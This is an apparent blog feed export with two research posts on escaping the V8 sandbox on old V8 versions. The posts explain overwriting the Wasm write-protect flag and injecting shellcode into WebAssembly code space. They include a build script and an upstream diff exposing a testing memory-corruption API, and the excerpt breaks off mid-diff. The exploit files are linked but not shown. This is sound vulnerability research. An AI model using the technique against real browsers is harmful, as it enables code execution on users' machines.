        <content type="html"><![CDATA[<p>Despite the patch for <a href="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/" title="Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)">part 1</a> aiming to prohibit overwriting the Wasm code space, it’s not yet thorough. We can still obtain unsandboxed AAW via the backing store of <code>ArrayBuffer</code>. Then, we can overwrite the execution flag with <code>false</code> at runtime to manually turn off the feature, achieving arbitrary code execution in the same manner as part 1.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Ubuntu 20.04 (WSL)</li><li><a href="https://github.com/v8/v8/commit/7e9715d8a955214788475dd33a16312ba4d5c3da"><code>7e9715d8a955214788475dd33a16312ba4d5c3da</code></a> (May 10, 2022)</li></ul><p>Place <a href="sandbox.diff"><code>sandbox.diff</code></a> and <a href="setup.py"><code>setup.py</code></a> in the working directory and run <code>setup.py</code>.</p><p><code>sandbox.diff</code> is identical to <a href="https://github.com/v8/v8/commit/4a12cb1022ba335ce087dcfe31b261355524b3bf">this commit</a>, which introduced a memory corruption API that enables us to implement exploit primitives working inside the V8 sandbox.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="WebAssembly-code-protection-via-mprotect"><a href="#WebAssembly-code-protection-via-mprotect" class="headerlink" title="WebAssembly code protection via mprotect"></a>WebAssembly code protection via mprotect</h3><p><a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/wasm/code-space-access.cc#L83"><code>CodeSpaceWriteScope::SetExecutable()</code></a> calls <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/wasm/code-space-access.cc#L89"><code>NativeModule::RemoveWriter()</code></a> to keep write permission not set while there’s no need to write anything to the Wasm code space. The permission is restored by <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/wasm/wasm-code-manager.cc#L822"><code>WasmCodeAllocator::MakeWritable()</code></a> if necessary. As a result, we can’t write our shellcode to the code space as in part 1, because there’d be no write permission at the moment we attempt to write.</p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/1.png"></p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/2.png"></p><p>However, <code>CodeSpaceWriteScope::SetExecutable()</code> checks <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/wasm/code-space-access.cc#L88"><code>FLAG_wasm_write_protect_code_memory</code></a> every time it’s called. If we can overwrite the flag with <code>false</code> at runtime, the feature is immediately disabled, and we can achieve arbitrary code execution in the same manner as part 1.</p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/3.png"></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Get-address-of-FLAG-wasm-write-protect-code-memory"><a href="#Get-address-of-FLAG-wasm-write-protect-code-memory" class="headerlink" title="Get address of FLAG_wasm_write_protect_code_memory"></a>Get address of FLAG_wasm_write_protect_code_memory</h3><p><a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/wasm/wasm-objects.h#L317"><code>WasmInstanceObject</code></a> has an accessor named <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/wasm/wasm-objects.h#L339"><code>isolate_root</code></a> which points to <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/execution/isolate.h#L2088"><code>isolate_data_</code></a>.</p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/4.png"></p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/5.png"></p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/6.png"></p><p><a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/execution/isolate-data.h#L70"><code>IsolateData</code></a> has <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/execution/isolate-data.h#L197"><code>external_reference_table_</code></a>, which contains a pointer to the execution flag of V8.</p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/7.png"></p><p>The order of the execution flags is consistent unless the V8 version is changed. Thus, we can reliably obtain the address of <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/flags/flag-definitions.h#L980"><code>FLAG_wasm_write_protect_code_memory</code></a> from the address of <a href="https://github.com/v8/v8/blob/7e9715d8a955214788475dd33a16312ba4d5c3da/src/flags/flag-definitions.h#L897"><code>FLAG_trace_osr</code></a>.</p><h3 id="Disable-code-protection-and-achieve-code-execution"><a href="#Disable-code-protection-and-achieve-code-execution" class="headerlink" title="Disable code protection and achieve code execution"></a>Disable code protection and achieve code execution</h3><p>We can overwrite the value of <code>FLAG_wasm_write_protect_code_memory</code> with <code>false</code> so that write permission of the Wasm code space would never be removed from now on.</p><p>Afterwards, we can achieve arbitrary code execution by overwriting the code space with shellcode, just as in part 1.</p><p><a href="empty.wat"><code>empty.wat</code></a> <a href="pwn.wat"><code>pwn.wat</code></a> <a href="shellcode.py"><code>shellcode.py</code></a> <a href="pwn.js"><code>pwn.js</code></a></p><p><img src="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/pwn.png"></p><h2 id="Bisection"><a href="#Bisection" class="headerlink" title="Bisection"></a>Bisection</h2><blockquote><p><a href="https://github.com/v8/v8/commit/f759872d52093d1ac2b531f7e8fa956264b57ad9">[wasm] Ship code protection via mprotect</a> (Feb 15, 2022)</p></blockquote><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote><p><a href="https://github.com/v8/v8/commit/48481a671ac7fed873f8a7e7203862beb6d89abd">[sandbox] Enable sandboxed pointers on Desktop</a> (May 5, 2022)</p><p><a href="https://github.com/v8/v8/commit/c50b995e4b57558745aef9dda73dc58c57681811">Revert “[sandbox] Enable sandboxed pointers on Desktop”</a> (May 5, 2022)</p><p><a href="https://github.com/v8/v8/commit/31d7838094a853556f345367038fe13252ea9224">Reland “[sandbox] Enable sandboxed pointers on Desktop”</a> (May 6, 2022)</p><p><a href="https://github.com/v8/v8/commit/91ab0528f23aaf4d65ae86b7cafdcac65cff6c37">Revert “Reland “[sandbox] Enable sandboxed pointers on Desktop””</a> (May 6, 2022)</p><p><a href="https://github.com/v8/v8/commit/9a6a76bf13d3ca1c6788de193afc5513919dd0ed">Reland “Reland “[sandbox] Enable sandboxed pointers on Desktop””</a> (May 10, 2022)</p></blockquote><p>The above commits enabled <code>v8_enable_sandboxed_pointers</code> by default when <code>v8_enable_sandbox</code> is enabled, resulting in the backing store of <code>ArrayBuffer</code> being allocated inside the V8 sandbox rather than in heap memory outside the sandbox, and <code>ArrayBuffer</code> containing a compressed pointer to the backing store.</p><blockquote><p><a href="https://github.com/v8/v8/commit/5b9401dde4532719220ac698eef7012cdd371903">[sandbox] Also enable the sandbox outside of Chromium builds</a> (Jun 17, 2022)</p><p><a href="https://github.com/v8/v8/commit/c878117fa0a848be0f011f410210ac4026baec05">Revert “[sandbox] Also enable the sandbox outside of Chromium builds”</a> (Jun 20, 2022)</p><p><a href="https://github.com/v8/v8/commit/a4d17470ab23b057327d614d032fc05ef70dd683">Reland “[sandbox] Also enable the sandbox outside of Chromium builds”</a> (Jun 21, 2022)</p><p><a href="https://github.com/v8/v8/commit/a7329344e52a0af3461aacaa8c538ddf8992e0d6">[sandbox] Disable the sandbox by default outside of Chromium builds</a> (Jul 19, 2022)</p><p><a href="https://github.com/v8/v8/commit/a8c27fcc9f9f15a0110a409190a2b514ec86e37f">[sandbox] Enable the sandbox by default in V8 builds</a> (Sep 23, 2022)</p></blockquote><p><code>v8_enable_sandbox</code> was enabled by default for standalone V8 builds in the commits above, while it has already been enabled in Chromium builds since the following commit.</p><blockquote><p><a href="https://github.com/v8/v8/commit/4fb3eae7afa2023057818d11faeefc031b78d444">Turn on v8_enable_virtual_memory_cage for Chromium builds</a> (Oct 4, 2021)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> N-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chromium </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)</title>
      <link href="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/"/>
      <url>/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/</url>
      
        <content type="html"><![CDATA[<p>In this post, I will explain an exploit technique that allows us to escape the V8 sandbox via the backing store of <code>ArrayBuffer</code> and WebAssembly code space. This leads us to arbitrary code execution starting from sandboxed exploit primitives.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Ubuntu 22.04</li><li><a href="https://github.com/v8/v8/commit/0ac7e1203fcb957851887fb140dc8a41139846a5"><code>0ac7e1203fcb957851887fb140dc8a41139846a5</code></a> (Feb 15, 2022)</li></ul><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install depot_tools</span></span><br><span class="line">depot_tools_path=<span class="string">&quot;<span class="variable">$HOME</span>/depot_tools&quot;</span> <span class="comment"># absolute path</span></span><br><span class="line"><span class="keyword">if</span> [ ! -e <span class="variable">$depot_tools_path</span> ]; <span class="keyword">then</span>  <span class="comment"># depot_tools doesn&#x27;t exist</span></span><br><span class="line">  git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git <span class="variable">$depot_tools_path</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">export PATH=<span class="variable">$depot_tools_path</span>:\$PATH</span></span><br><span class="line"><span class="string">export DEPOT_TOOLS_UPDATE=0&quot;</span> &gt;&gt;~/.zshrc</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$depot_tools_path</span></span><br><span class="line">git checkout 4e4a2b865b6f1dfdda767dd04b210cb0e43fb4c6 <span class="comment"># https://github.com/v8/v8/blob/0ac7e1203fcb957851887fb140dc8a41139846a5/DEPS#L220</span></span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># get v8 and submodules</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;solutions = [</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;v8&quot;,</span></span><br><span class="line"><span class="string">    &quot;url&quot;: &quot;https://chromium.googlesource.com/v8/v8.git@0ac7e1203fcb957851887fb140dc8a41139846a5&quot;,</span></span><br><span class="line"><span class="string">    &quot;managed&quot;: True,</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">]&#x27;</span> &gt;.gclient</span><br><span class="line">gclient <span class="built_in">sync</span> -Dvvv</span><br><span class="line"></span><br><span class="line"><span class="comment"># build v8</span></span><br><span class="line"><span class="built_in">pushd</span> v8</span><br><span class="line">git apply ../sandbox.diff</span><br><span class="line"><span class="built_in">sudo</span> apt install -y apache2-bin binutils binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf binutils-mips64el-linux-gnuabi64 binutils-mipsel-linux-gnu bison bzip2 cdbs curl dbus-x11 devscripts dpkg-dev elfutils fakeroot flex git-core gperf lib32gcc-s1 lib32stdc++6 libasound2 libasound2-dev libatk1.0-0 libatspi2.0-0 libatspi2.0-dev libbluetooth-dev libbrlapi0.8 libbrlapi-dev libbz2-1.0 libbz2-dev libc6 libc6-dev libc6-i386 libcairo2 libcairo2-dev libcap2 libcap-dev libcups2 libcups2-dev libcurl4-gnutls-dev libdrm2 libdrm-dev libelf-dev libevdev2 libevdev-dev libexpat1 libffi7 libffi-dev libfontconfig1 libfreetype6 libgbm1 libgbm-dev libglib2.0-0 libglib2.0-dev libglu1-mesa-dev libgtk-3-0 libgtk-3-dev libinput10 libinput-dev libjpeg-dev libkrb5-dev libnspr4 libnspr4-dev libnss3 libnss3-dev libpam0g libpam0g-dev libpango-1.0-0 libpci3 libpci-dev libpcre3 libpixman-1-0 libpng16-16 libpulse0 libpulse-dev libsctp-dev libspeechd2 libspeechd-dev libsqlite3-0 libsqlite3-dev libssl-dev libstdc++6 libudev1 libudev-dev libuuid1 libva-dev libvulkan1 libvulkan-dev libwayland-egl1-mesa libwww-perl libx11-6 libx11-xcb1 libxau6 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxdmcp6 libxext6 libxfixes3 libxi6 libxinerama1 libxkbcommon-dev libxrandr2 libxrender1 libxshmfence-dev libxslt1-dev libxss-dev libxt-dev libxtst6 libxtst-dev locales mesa-common-dev openbox p7zip patch perl pkg-config python-setuptools rpm ruby snapcraft subversion uuid-dev wdiff x11-utils xcompmgr xz-utils zip zlib1g <span class="comment"># manually install build dependencies</span></span><br><span class="line">gn gen out/debug --args=<span class="string">&#x27;v8_enable_sandbox=true v8_expose_memory_corruption_api=true is_component_build=false v8_optimized_debug=false&#x27;</span></span><br><span class="line">gn gen out/release --args=<span class="string">&#x27;v8_enable_sandbox=true v8_expose_memory_corruption_api=true is_debug=false v8_enable_object_print=true v8_symbol_level=2&#x27;</span></span><br><span class="line">autoninja -C out/debug d8</span><br><span class="line">autoninja -C out/release d8</span><br><span class="line"><span class="built_in">popd</span></span><br></pre></td></tr></table></figure><p><code>sandbox.diff</code> below is identical to <a href="https://github.com/v8/v8/commit/4a12cb1022ba335ce087dcfe31b261355524b3bf">this commit</a>, which allows us to use the memory corruption API to implement sandboxed exploit primitives.</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/BUILD.bazel b/BUILD.bazel</span></span><br><span class="line"><span class="comment">index 8d1184f0925..c58bf397ef8 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.bazel</span></span><br><span class="line"><span class="comment">+++ b/BUILD.bazel</span></span><br><span class="line"><span class="meta">@@ -1926,6 +1926,8 @@</span> filegroup(</span><br><span class="line">         &quot;src/sandbox/external-pointer-table.cc&quot;,</span><br><span class="line">         &quot;src/sandbox/external-pointer-table-inl.h&quot;,</span><br><span class="line">         &quot;src/sandbox/external-pointer-table.h&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/sandbox/testing.cc&quot;,</span></span><br><span class="line"><span class="addition">+        &quot;src/sandbox/testing.h&quot;,</span></span><br><span class="line">         &quot;src/sandbox/sandbox.cc&quot;,</span><br><span class="line">         &quot;src/sandbox/sandbox.h&quot;,</span><br><span class="line">         &quot;src/sandbox/sandboxed-pointer-inl.h&quot;,</span><br><span class="line"><span class="comment">diff --git a/BUILD.gn b/BUILD.gn</span></span><br><span class="line"><span class="comment">index 6adac93038c..23137954f3f 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.gn</span></span><br><span class="line"><span class="comment">+++ b/BUILD.gn</span></span><br><span class="line"><span class="meta">@@ -311,6 +311,11 @@</span> declare_args() &#123;</span><br><span class="line">   # Enable all available sandbox features. Implies v8_enable_sandbox.</span><br><span class="line">   v8_enable_sandbox_future = false</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  # Expose the memory corruption API to JavaScript. Useful for testing the sandbox.</span></span><br><span class="line"><span class="addition">+  # WARNING This will expose builtins that (by design) cause memory corruption.</span></span><br><span class="line"><span class="addition">+  # Sets -DV8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+  v8_expose_memory_corruption_api = false</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   # Experimental feature for collecting per-class zone memory stats.</span><br><span class="line">   # Requires use_rtti = true</span><br><span class="line">   v8_enable_precise_zone_stats = false</span><br><span class="line"><span class="meta">@@ -531,6 +536,9 @@</span> assert(!v8_enable_sandboxed_pointers || v8_enable_sandbox,</span><br><span class="line"> assert(!v8_enable_sandboxed_external_pointers || v8_enable_sandbox,</span><br><span class="line">        &quot;Sandboxed external pointers require the sandbox&quot;)</span><br><span class="line"> </span><br><span class="line"><span class="addition">+assert(!v8_expose_memory_corruption_api || v8_enable_sandbox,</span></span><br><span class="line"><span class="addition">+       &quot;The Memory Corruption API requires the sandbox&quot;)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> assert(</span><br><span class="line">     !v8_enable_pointer_compression_shared_cage || v8_enable_pointer_compression,</span><br><span class="line">     &quot;Can&#x27;t share a pointer compression cage if pointers aren&#x27;t compressed&quot;)</span><br><span class="line"><span class="meta">@@ -992,6 +1000,9 @@</span> config(&quot;features&quot;) &#123;</span><br><span class="line">   if (v8_fuchsia_use_vmex_resource) &#123;</span><br><span class="line">     defines += [ &quot;V8_USE_VMEX_RESOURCE&quot; ]</span><br><span class="line">   &#125;</span><br><span class="line"><span class="addition">+  if (v8_expose_memory_corruption_api) &#123;</span></span><br><span class="line"><span class="addition">+    defines += [ &quot;V8_EXPOSE_MEMORY_CORRUPTION_API&quot; ]</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> config(&quot;toolchain&quot;) &#123;</span><br><span class="line"><span class="meta">@@ -3369,6 +3380,7 @@</span> v8_header_set(&quot;v8_internal_headers&quot;) &#123;</span><br><span class="line">     &quot;src/sandbox/sandbox.h&quot;,</span><br><span class="line">     &quot;src/sandbox/sandboxed-pointer-inl.h&quot;,</span><br><span class="line">     &quot;src/sandbox/sandboxed-pointer.h&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/sandbox/testing.h&quot;,</span></span><br><span class="line">     &quot;src/snapshot/code-serializer.h&quot;,</span><br><span class="line">     &quot;src/snapshot/context-deserializer.h&quot;,</span><br><span class="line">     &quot;src/snapshot/context-serializer.h&quot;,</span><br><span class="line"><span class="meta">@@ -4397,6 +4409,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/runtime/runtime.cc&quot;,</span><br><span class="line">     &quot;src/sandbox/external-pointer-table.cc&quot;,</span><br><span class="line">     &quot;src/sandbox/sandbox.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/sandbox/testing.cc&quot;,</span></span><br><span class="line">     &quot;src/snapshot/code-serializer.cc&quot;,</span><br><span class="line">     &quot;src/snapshot/context-deserializer.cc&quot;,</span><br><span class="line">     &quot;src/snapshot/context-serializer.cc&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index 318afc569e3..2db82fed905 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -24,6 +24,7 @@</span></span><br><span class="line"> #include &quot;src/logging/runtime-call-stats-scope.h&quot;</span><br><span class="line"> #include &quot;src/objects/instance-type.h&quot;</span><br><span class="line"> #include &quot;src/objects/objects.h&quot;</span><br><span class="line"><span class="addition">+#include &quot;src/sandbox/testing.h&quot;</span></span><br><span class="line"> #ifdef ENABLE_VTUNE_TRACEMARK</span><br><span class="line"> #include &quot;src/extensions/vtunedomain-support-extension.h&quot;</span><br><span class="line"> #endif  // ENABLE_VTUNE_TRACEMARK</span><br><span class="line"><span class="meta">@@ -5769,6 +5770,12 @@</span> bool Genesis::InstallSpecialObjects(Isolate* isolate,</span><br><span class="line">   &#125;</span><br><span class="line"> #endif  // V8_ENABLE_WEBASSEMBLY</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+  if (GetProcessWideSandbox()-&gt;is_initialized()) &#123;</span></span><br><span class="line"><span class="addition">+    MemoryCorruptionApi::Install(isolate);</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   return true;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/src/sandbox/sandbox.h b/src/sandbox/sandbox.h</span></span><br><span class="line"><span class="comment">index 20f2343db50..b5300e4d010 100644</span></span><br><span class="line"><span class="comment">--- a/src/sandbox/sandbox.h</span></span><br><span class="line"><span class="comment">+++ b/src/sandbox/sandbox.h</span></span><br><span class="line"><span class="meta">@@ -12,7 +12,6 @@</span></span><br><span class="line"> #include &quot;testing/gtest/include/gtest/gtest_prod.h&quot;  // nogncheck</span><br><span class="line"> </span><br><span class="line"> namespace v8 &#123;</span><br><span 